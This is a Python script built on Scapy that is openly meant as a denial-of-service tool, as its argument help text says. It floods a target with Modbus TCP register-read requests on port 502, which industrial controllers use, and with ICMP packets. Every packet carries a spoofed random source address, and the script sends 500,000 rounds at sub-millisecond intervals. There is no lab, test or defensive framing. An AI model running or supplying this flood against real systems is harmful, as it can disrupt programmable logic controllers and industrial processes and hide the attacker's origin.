from scapy.all import IP, ICMP, TCP, send, ls, ShortField, XByteField, Packet
import random
import time
from scapy.contrib.modbus import ModbusADURequest, ModbusPDU03ReadHoldingRegistersRequest
import argparse
import asyncio

def random_ip():
    """Generate a random IP address for source."""
    return f"{random.randint(1, 255)}.{random.randint(0, 255)}." \
           f"{random.randint(0, 255)}.{random.randint(0, 255)}"


def create_modbus_tcp_packet(dst_ip, src_ip=None, unit_id=1, func_code=3, start_addr=0, quantity=1):
    """
    Create a Modbus TCP packet to read registers of PLC.

    Args:
    - dst_ip: Destination IP address
    - src_ip: Source IP address (optional)
    - unit_id: Unit identifier
    - func_code: Modbus function code (3 for reading holding registers)
    - start_addr: Start address of the register to read
    - quantity: Number of registers to read

    Returns:
    - packet: Constructed Modbus TCP packet
    """
    if not src_ip:
        src_ip = random_ip()  # Example source IP, change as needed

    ip_layer = IP(src=src_ip, dst=dst_ip)
    tcp_layer = TCP(sport=random.randint(1024,65535), dport=502)  # Modbus TCP typically uses port 502

    # Modbus PDU
    modbus_pdu = ModbusPDU03ReadHoldingRegistersRequest(funcCode=func_code, startAddr=start_addr, quantity=quantity)

    # Modbus ADU
    modbus_adu = ModbusADURequest(protoId=0, unitId=unit_id) / modbus_pdu

    return ip_layer / tcp_layer / modbus_adu

def create_icmp_packet(dst_ip, src_ip=None):
    """Create an ICMP packet with random source IP and specific destination IP."""
    if not src_ip:
        src_ip = random_ip()
    ip_layer = IP(src=src_ip, dst=dst_ip)
    icmp_packet = ICMP()
    return ip_layer / icmp_packet

async def send_packet(target):
    """Send a Modbus and ICMP packet to a target."""
    print(f"Sending packet to {target}")
    modbus_packet = create_modbus_tcp_packet(target)
    icmp_packet = create_icmp_packet(target)
    send(modbus_packet, verbose=False)
    send(icmp_packet, verbose=False)

async def send_packets(target, count=10000, interval=0.1):
    """Send Modbus and ICMP packets from random source addresses to a target at intervals."""
    for _ in range(count):
        await send_packet(target)
        await asyncio.sleep(interval)

parser = argparse.ArgumentParser()
parser.add_argument('target', help='the target IP for the DoS attack')
args = parser.parse_args()

# Create an asyncio event loop
loop = asyncio.get_event_loop()
# Run the send_packets function in the event loop
loop.run_until_complete(send_packets(args.target, count=500000, interval=0.0005))